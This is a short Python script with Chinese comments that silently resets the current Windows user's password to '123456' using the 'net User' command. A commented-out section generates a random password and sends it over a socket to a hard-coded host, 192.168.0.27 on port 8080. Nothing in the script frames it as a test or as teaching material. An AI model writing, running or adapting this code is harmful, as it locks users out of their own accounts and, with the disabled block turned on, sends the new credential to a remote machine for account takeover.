# -*- coding: utf-8 -*-
"""
Created on Mon Mar 18 16:11:33 2019

@author: ctrpg
"""

# 导入 socket、sys 模块
import socket
import sys
import subprocess,getpass,string,random
# 创建 socket 对象
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

#开始操作。。。。
user = getpass.getuser()
# 生成a-zA-Z0-9的随机密码
'''letters = string.ascii_letters + string.digits
pwd = ''.join([random.choice(letters) for _ in range(8)])'''
pwd = '123456'
# 控制windows cmd，并修改密码
subprocess.Popen(['net', 'User', user, pwd])
'''# 获取本地主机名
host = '192.168.0.27'

# 设置端口号
port = 8080

# 连接服务，指定主机和端口
s.connect((host, port))

# 发送密码
s.send(pwd)
s.close()'''